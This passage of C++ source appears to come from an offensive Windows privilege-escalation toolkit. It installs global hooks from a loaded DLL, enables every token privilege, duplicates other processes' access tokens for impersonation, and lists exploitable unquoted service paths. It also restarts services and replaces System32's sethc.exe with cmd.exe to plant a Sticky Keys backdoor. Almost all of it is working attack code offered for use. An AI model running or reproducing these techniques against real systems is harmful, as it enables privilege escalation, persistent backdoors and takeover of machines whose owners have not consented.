		CloseHandle(hSnapshot);
	}
}

// NOTE: Your DLL must export HookProc() and GetHookType().
void HookJob(struct hook* info) {
	info->active = true;
	HMODULE hLib = LoadLibraryA(info->file.c_str());
	if (hLib == NULL) {
		Output("Cannot load the \"" + info->file + "\"");
	}
	else {
		HOOKPROC HookProc = (HOOKPROC)GetProcAddress(hLib, "HookProc");
		if (HookProc == NULL) {
			Output("Cannot get the address of HookProc()");
		}
		else {
			FARPROC GetHookType = (FARPROC)GetProcAddress(hLib, "GetHookType");
			if (GetHookType == NULL) {
				Output("Cannot get the address of GetHookType()");
			}
			else {
				HHOOK hHook = SetWindowsHookEx(GetHookType(), HookProc, hLib, 0);
				if (hHook == NULL) {
					Output("Cannot install the hook procedure");
				}
				else {
					Output("Hook procedure has been installed successfully");
					MSG msg = { 0 };
					while (info->active && PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE) != WM_QUIT) {
						TranslateMessage(&msg);
						DispatchMessage(&msg);
					}
					UnhookWindowsHookEx(hHook);
					Output("");
					Output("Hook procedure has been uninstalled successfully");
					CloseHandle(hHook);
				}
			}
		}
		FreeLibrary(hLib);
	}
	info->active = false;
}

HANDLE CreateHookThread(struct hook* info) {
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)HookJob, info, 0, NULL);
	if (hThread == NULL) {
		Output("Cannot create the hook thread");
	}
	else {
		// NOTE: Just a little delay so the output doesn't get messed up.
		WaitForSingleObject(hThread, 500);
	}
	return hThread;
}

void RemoveHookThread(struct hook* info) {
	info->active = false;
	WaitForSingleObject(info->hThread, INFINITE);
	CloseHandle(info->hThread);
}

// ----------------------------------- TOKEN -----------------------------------

void EnableAccessTokenPrivs() {
	HANDLE hProcess = GetCurrentProcess();
	if (hProcess == NULL) {
		Output("Cannot get the process handle");
	}
	else {
		HANDLE hToken = NULL;
		if (OpenProcessToken(hProcess, (TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES), &hToken) == 0) {
			Output("Cannot get the token handle");
		}
		else {
			struct privs {
				const std::string privilege;
				bool set;
			};
			privs array[] = {
				{ "SeAssignPrimaryTokenPrivilege",             false },
				{ "SeAuditPrivilege",                          false },
				{ "SeBackupPrivilege",                         false },
				{ "SeChangeNotifyPrivilege",                   false },
				{ "SeCreateGlobalPrivilege",                   false },
				{ "SeCreatePagefilePrivilege",                 false },
				{ "SeCreatePermanentPrivilege",                false },
				{ "SeCreateSymbolicLinkPrivilege",             false },
				{ "SeCreateTokenPrivilege",                    false },
				{ "SeDebugPrivilege",                          false },
				{ "SeDelegateSessionUserImpersonatePrivilege", false },
				{ "SeEnableDelegationPrivilege",               false },
				{ "SeImpersonatePrivilege",                    false },
				{ "SeIncreaseBasePriorityPrivilege",           false },
				{ "SeIncreaseQuotaPrivilege",                  false },
				{ "SeIncreaseWorkingSetPrivilege",             false },
				{ "SeLoadDriverPrivilege",                     false },
				{ "SeLockMemoryPrivilege",                     false },
				{ "SeMachineAccountPrivilege",                 false },
				{ "SeManageVolumePrivilege",                   false },
				{ "SeProfileSingleProcessPrivilege",           false },
				{ "SeRelabelPrivilege",                        false },
				{ "SeRemoteShutdownPrivilege",                 false },
				{ "SeRestorePrivilege",                        false },
				{ "SeSecurityPrivilege",                       false },
				{ "SeShutdownPrivilege",                       false },
				{ "SeSyncAgentPrivilege",                      false },
				{ "SeSystemEnvironmentPrivilege",              false },
				{ "SeSystemProfilePrivilege",                  false },
				{ "SeSystemtimePrivilege",                     false },
				{ "SeTakeOwnershipPrivilege",                  false },
				{ "SeTcbPrivilege",                            false },
				{ "SeTimeZonePrivilege",                       false },
				{ "SeTrustedCredManAccessPrivilege",           false },
				{ "SeUndockPrivilege",                         false },
				{ "SeUnsolicitedInputPrivilege",               false }
			};
			int size = sizeof(array) / sizeof(array[0]);
			for (int i = 0; i < size - 1; i++) {
				TOKEN_PRIVILEGES tp = { 0 };
				if (LookupPrivilegeValueA(NULL, array[i].privilege.c_str(), &tp.Privileges[0].Luid) != 0) {
					tp.PrivilegeCount = 1;
					tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
					if (AdjustTokenPrivileges(hToken, 0, &tp, sizeof(tp), NULL, NULL) != 0 && GetLastError() == ERROR_SUCCESS) {
						array[i].set = true;
					}
				}
			}
			Output("############################ PRIVILEGES ENABLED ############################");
			for (int i = 0; i < size - 1; i++) {
				if (array[i].set) {
					printf("# %-*.*s #\n", 72, 72, array[i].privilege.c_str());
				}
			}
			Output("############################################################################");
			Output("");
			Output("############################ PRIVILEGES ENABLED ############################");
			for (int i = 0; i < size - 1; i++) {
				if (!array[i].set) {
					printf("# %-*.*s #\n", 72, 72, array[i].privilege.c_str());
				}
			}
			Output("############################################################################");
			CloseHandle(hToken);
		}
		CloseHandle(hProcess);
	}
}

HANDLE DuplicateAccessToken(int pid) {
	HANDLE dToken = NULL;
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);
	if (hProcess == NULL) {
		hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);
	}
	if (hProcess == NULL) {
		Output("Cannot get the process handle");
	}
	else {
		HANDLE hToken = NULL;
		if (OpenProcessToken(hProcess, (TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY), &hToken) == 0) {
			Output("Cannot get the token handle");
		}
		else {
			if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dToken) == 0) {
				Output("Cannot duplicate the token");
			}
			else {
				Output("Token has been duplicated successfully");
			}
			CloseHandle(hToken);
		}
		CloseHandle(hProcess);
	}
	return dToken;
}

// ----------------------------------- MISCS -----------------------------------

// NOTE: This method must allocate a lot of additional process memory.
// NOTE: This method will only search for unquoted service paths outside of \Windows\ directory.
// NOTE: Services must be able to start either automatically or manually and either be running or stopped.
std::string GetUnquotedServiceName() {
	std::string name = "";
	SC_HANDLE hManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ENUMERATE_SERVICE);
	if (hManager == NULL) {
		Output("Cannot get the service control manager handle");
	}
	else {
		DWORD size = 0, count = 0, resume = 0;
		if (EnumServicesStatusA(hManager, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, 0, &size, &count, 0) != 0) {
			Output("Cannot get the size of additional process memory");
		}
		else {
			LPENUM_SERVICE_STATUSA buffer = (LPENUM_SERVICE_STATUSA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
			if (buffer == NULL) {
				Output("Cannot allocate the additional process memory");
			}
			else {
				if (EnumServicesStatusA(hManager, SERVICE_WIN32, SERVICE_STATE_ALL, buffer, size, &size, &count, &resume) == 0) {
					Output("Cannot enumerate the services");
				}
				else {
					LPENUM_SERVICE_STATUSA services = buffer;
					bool exists = false;
					for (DWORD i = 0; i < count; i++) {
						SC_HANDLE hService = OpenServiceA(hManager, services->lpServiceName, SERVICE_QUERY_CONFIG);
						if (hService != NULL) {
							if (QueryServiceConfig(hService, NULL, 0, &size) == 0) {
								LPQUERY_SERVICE_CONFIGA config = (LPQUERY_SERVICE_CONFIGA)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
								if (config != NULL) {
									if (QueryServiceConfigA(hService, config, size, &size) != 0) {
										std::string path(config->lpBinaryPathName, strlen(config->lpBinaryPathName));
										if (path.find("\"") == std::string::npos && StrToLower(path).find(":\\windows\\") == std::string::npos && (config->dwStartType == SERVICE_AUTO_START || config->dwStartType == SERVICE_DEMAND_START) && (services->ServiceStatus.dwCurrentState == SERVICE_RUNNING || services->ServiceStatus.dwCurrentState == SERVICE_STOPPED)) {
											exists = true;
											printf("Name        : %s\n", services->lpServiceName);
											printf("DisplayName : %s\n", services->lpDisplayName);
											printf("PathName    : %s\n", config->lpBinaryPathName);
											printf("StartName   : %s\n", config->lpServiceStartName);
											printf("StartMode   : %s\n", config->dwStartType == SERVICE_AUTO_START ? "Auto" : "Manual");
											printf("State       : %s\n", services->ServiceStatus.dwCurrentState == SERVICE_RUNNING ? "Running" : "Stopped");
											Output("");
										}
									}
									HeapFree(GetProcessHeap(), 0, config);
								}
							}
							CloseServiceHandle(hService);
						}
						services++;
					}
					if (exists) {
						std::string str = Input("Enter service name");
						if (str.length() < 1) {
							Output("");
							Output("Service name is rquired");
						}
						else {
							services = buffer;
							exists = false;
							for (DWORD i = 0; i < count; i++) {
								if (services->lpServiceName == str) {
									exists = true;
									name = services->lpServiceName;
									break;
								}
								services++;
							}
							if (!exists) {
								Output("");
								Output("Service does not exists");
							}
						}
					}
					else {
						Output("No unquoted service paths were found");
					}
				}
				HeapFree(GetProcessHeap(), 0, buffer);
			}
		}
		CloseServiceHandle(hManager);
	}
	return name;
}

// NOTE: Task 1 - Start
//       Task 2 - Stop
//       Task 3 - Restart
bool ManageService(std::string name, int task) {
	bool success = false;
	SC_HANDLE hManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ENUMERATE_SERVICE);
	if (hManager == NULL) {
		Output("Cannot get the service control manager handle");
	}
	else {
		SC_HANDLE hService = OpenServiceA(hManager, name.c_str(), (SERVICE_QUERY_STATUS | SERVICE_START | SERVICE_STOP));
		if (hService == NULL) {
			Output("Cannot get the service handle");
		}
		else {
			SERVICE_STATUS info = { 0 };
			if (QueryServiceStatus(hService, &info) == 0) {
				Output("Cannot get the service information");
			}
			else {
				if (task == SVC_STOP || task == SVC_RESTART) {
					if (info.dwCurrentState == SERVICE_STOPPED) {
						success = true;
						Output("Service is not running");
					}
					else if (ControlService(hService, SERVICE_CONTROL_STOP, &info) == 0) {
						success = false;
						Output("Cannot stop the service");
					}
					else {
						while (info.dwCurrentState != SERVICE_STOPPED) {
							if (QueryServiceStatus(hService, &info) == 0) {
								success = false;
								Output("Cannot update the service info");
								break;
							}
							Sleep(200);
							if (info.dwCurrentState == SERVICE_STOPPED) {
								success = true;
								Output("Service has been stopped successfully");
								break;
							}
						}
					}
					if (task == SVC_RESTART) {
						Output("");
					}
				}

				if (task == SVC_START || task == SVC_RESTART) {
					if (info.dwCurrentState == SERVICE_RUNNING) {
						success = true;
						Output("Service is already running");
					}
					else if (StartService(hService, 0, NULL) == 0) {
						success = false;
						Output("Cannot start the service");
					}
					else {
						while (info.dwCurrentState != SERVICE_RUNNING) {
							if (QueryServiceStatus(hService, &info) == 0) {
								success = false;
								Output("Cannot update the service info");
								break;
							}
							Sleep(200);
							if (info.dwCurrentState == SERVICE_RUNNING) {
								success = true;
								Output("Service has been started successfully");
								break;
							}
						}
					}
				}
			}
			CloseServiceHandle(hService);
		}
		CloseServiceHandle(hManager);
	}
	return success;
}

// NOTE: To restore the backup, rename sethc_backup.exe back to sethc.exe.
// TO DO: Add more programs to replace, e.g. add Magnify.exe, Narrator.exe, etc.
// TO DO: Add a restore option.
bool ReplaceStickyKeys() {
	bool success = false;
	char* buffer = NULL;
	size_t size = 0;
	if (_dupenv_s(&buffer, &size, "WINDIR") != 0) {
		Output("Cannot resolve %WINDIR% path");
	}
	else {
		std::string dir = std::string(buffer, strlen(buffer)).append("\\System32\\");
		if (DuplicateFile(dir + "sethc.exe", dir + "sethc_backup.exe") != 0) {
			Output("");
			Output("Replacing Sticky Keys with Command Prompt...");
			Output("");
			if (DuplicateFile(dir + "cmd.exe", dir + "sethc.exe") != 0) {
				success = true;
				Output("");
				Output("Press the shift key five times...");
			}
		}
		free(buffer);
	}
	return success;
}

